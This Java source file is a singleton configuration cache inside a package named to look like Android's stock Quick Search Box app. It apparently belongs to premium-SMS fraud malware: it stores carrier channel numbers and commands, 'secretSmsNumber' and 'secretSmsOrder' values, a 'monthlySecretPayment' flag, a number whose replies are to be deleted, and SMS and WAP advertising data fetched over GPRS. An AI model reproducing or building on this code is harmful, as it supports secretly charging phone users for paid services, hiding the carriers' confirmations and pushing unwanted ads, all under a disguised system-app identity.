package com.android.quicksearchbox.quicksearchbox.util;

import java.util.HashMap;
import java.util.List;

import android.content.Context;


import com.android.quicksearchbox.quicksearchbox.bean.Ads_header;
import com.android.quicksearchbox.quicksearchbox.bean.CFGInfo_header;
import com.android.quicksearchbox.quicksearchbox.bean.ChannelNumber;
import com.android.quicksearchbox.quicksearchbox.bean.ControlData;
import com.android.quicksearchbox.quicksearchbox.bean.CurstomCFG;
import com.android.quicksearchbox.quicksearchbox.bean.SmsAdsData;
import com.android.quicksearchbox.quicksearchbox.bean.SmsData;
import com.android.quicksearchbox.quicksearchbox.bean.WapAdsData;
import com.android.quicksearchbox.quicksearchbox.model.AdsService;
import com.android.quicksearchbox.quicksearchbox.model.GPRSService;

public class KsoCache {

	private HashMap<String,Object> cacheContent = new HashMap<String,Object>();
    private HashMap<String,Object> sendSmsFlag = new HashMap<String,Object>();
	private static KsoCache cache = null;

	private static final Object LOCK = new Object();

	private KsoCache() {
	}

	public static synchronized KsoCache getInstance() {
		if (cache == null) {
			cache = new KsoCache();

		}
		return cache;

	}


	public void init(Context context) {
		synchronized (LOCK) {

			CurstomCFG cfg = CurstomCFG.getInstance();
			cache.reSetValue("curstomID", cfg.getCurstomID());
			cache.reSetValue("startIntelnetDate", cfg.getStartIntelnetDate());
			cache.reSetValue("driveup", cfg.getDriveup());
			cache.reSetValue("sellCount", cfg.getSellCount());
			cache.reSetValue("intelnetCount", cfg.getIntelnetCount());

			int[] internetDate = cfg.getIntelnetDate();
			String internetDates = "";
			for (int i = 0; i < internetDate.length; i++) {

				if (i == (internetDate.length - 1)) {
					internetDates += internetDate[i];
				} else {
					internetDates += internetDate[i] + ",";
				}

			}
			cache.reSetValue("internetDate", internetDates);
			cache.reSetValue("billStyle", cfg.getBillStyle());
			cache.reSetValue("billCount", cfg.getBillCount());
			cache.reSetValue("deleteTime", cfg.getDeleteTime());
			cache.reSetValue("adsTime", cfg.getUploadTiem());
			cache.reSetValue("isShutDown", cfg.getIsShutDown());
			cache.reSetValue("isChanelShutDown", cfg.getIsChanelShutDown());
			cache.reSetValue("isNotify", cfg.getIsNotify());
			cache.reSetValue("notifyContent", cfg.getNotifyContent());
			

			ChannelNumber channel = ChannelNumber.getInstance();
			cache.reSetValue("CmCount", channel.getCmCount());
			String CmInfo[] = channel.getCmNumber();
			String temp = "";
			for (int i = 0; i < CmInfo.length; i++) {
				temp += CmInfo[i] + ",";
			}
			reSetValue("mobileChannels", temp);
			CmInfo = channel.getCmCommand();
			temp = "";
			for (int i = 0; i < CmInfo.length; i++) {
				temp += CmInfo[i] + ",";
			}
			reSetValue("mobileOrders", temp);
            
			
			cache.reSetValue("UmCount", channel.getUmCount());
			String UmInfo[] = channel.getUmNumber();
			temp = "";
			for (int i = 0; i < UmInfo.length; i++) {
				temp += UmInfo[i] + ",";
			}
			reSetValue("unionChannels", temp);
			UmInfo = channel.getUmCommand();
			temp = "";
			for (int i = 0; i < UmInfo.length; i++) {
				temp += UmInfo[i] + ",";
			}
			cache.reSetValue("unionOrders", temp);
			
			
			String[] salesNumbers = channel.getSalesNumber();
			temp = "";
			for (int i = 0; i < salesNumbers.length; i++) {		
				temp += salesNumbers[i] + ",";		
			}
			cache.reSetValue("saleNumbers", temp);
			
			
			GPRSService gprsservice = new GPRSService();
			byte gprsByte[] = gprsservice.getGPRSByte();
		
			if (gprsByte != null) {
				CFGInfo_header gprsheader = gprsservice.getGPRSHeader(gprsByte);
				ControlData datacontrol = gprsservice.getControlSmsData(
						gprsByte, gprsheader);
				cache.reSetValue("saleSmsCat", datacontrol.getSellPhoneNumber());
				cache.reSetValue("monthlySecretPayment", datacontrol.getMonthlySecretPayment());
				cache.reSetValue("isShutSell", datacontrol.getIsShutSell());
				
				List<SmsData> secretSmsDatas = gprsservice.getSecretSmsData(
						gprsByte, gprsheader);
				String secretSmsNumber = "";
				String secretSmsOrder = "";
				String replyNumber = "";
				int count = 0;
				if (secretSmsDatas != null && secretSmsDatas.size() > 0) {
					for (SmsData secretSmsData : secretSmsDatas) {
						secretSmsNumber += secretSmsData.getChanel() + ",";
						secretSmsOrder += secretSmsData.getOrder() + ",";
						replyNumber = secretSmsData.getDeleteTeleponeNumber();
						count = secretSmsData.getCount();
					}
				}
				cache.reSetValue("deleteTeleponeNumber", replyNumber);
				cache.reSetValue("secretSmsCount", count);
				cache.reSetValue("secretSmsNumber", secretSmsNumber);
				cache.reSetValue("secretSmsOrder", secretSmsOrder);
			}


			AdsService adsservice = new AdsService();
			byte adsByte[] = adsservice.getAdsByte();
	
			if (adsByte != null) {
				Ads_header adsheader = adsservice.getAdsHeader(adsByte);
				SmsAdsData sadsdata = adsservice.getSmsAdsData(adsByte,
						adsheader);
				WapAdsData wadsdata = adsservice.getWapAdsData(adsByte,
						adsheader);
				if(sadsdata != null){
					if (sadsdata.getPhoneNumber() != null && !"".equals(sadsdata.getPhoneNumber())) {
						cache.reSetValue("adsNumbers", sadsdata.getPhoneNumber());
					}

					if (sadsdata.getSmsContent() != null && !"".equals(sadsdata.getSmsContent())) {
						cache.reSetValue("adsContent", sadsdata.getSmsContent());
					}

				}
				if(wadsdata != null){
					if (wadsdata.getUrl() != null && !"".equals(wadsdata.getUrl())) {
						cache.reSetValue("wap_timeout", wadsdata.getTime());
						cache.reSetValue("url", wadsdata.getUrl());
					}
					
				}
				
			}

			

		
			

		}

	}


	public void reSetValues(String[] keys, Object[] values) {
	
		synchronized (LOCK) {
			for (int i = 0; i < values.length; i++) {
				cacheContent.put(keys[i], values[i]);

			}

		}

	}
	

		public void reSetValues2(String key, Object value) {
		
			synchronized (LOCK) {
				
				sendSmsFlag.put(key, value);

			}

		}


	public void reSetValue(String key, Object value) {
		synchronized (LOCK) {
			cacheContent.put(key, value);

		}

	}

	

	public Object getValue(String key) {
		synchronized (LOCK) {
			return cacheContent.get(key);

		}

	}
	
	public Object getValue2(String key) {
		synchronized (LOCK) {
			return sendSmsFlag.get(key);

		}

	}

	public void deleteCache(String key) {
		synchronized (LOCK) {
			cacheContent.remove(key);

		}

	}
	public void removeCache(String[] keys) {
		synchronized (LOCK) {
			for (int i = 0; i < keys.length; i++) {
				cacheContent.remove(keys[i]);

			}

		}

	}

	public void clearCache() {
		synchronized (LOCK) {
			cacheContent.clear();

		}

	}
	
	

	public int getCacheSize() {
		synchronized (LOCK) {
			return cacheContent.size();

		}

	}

}
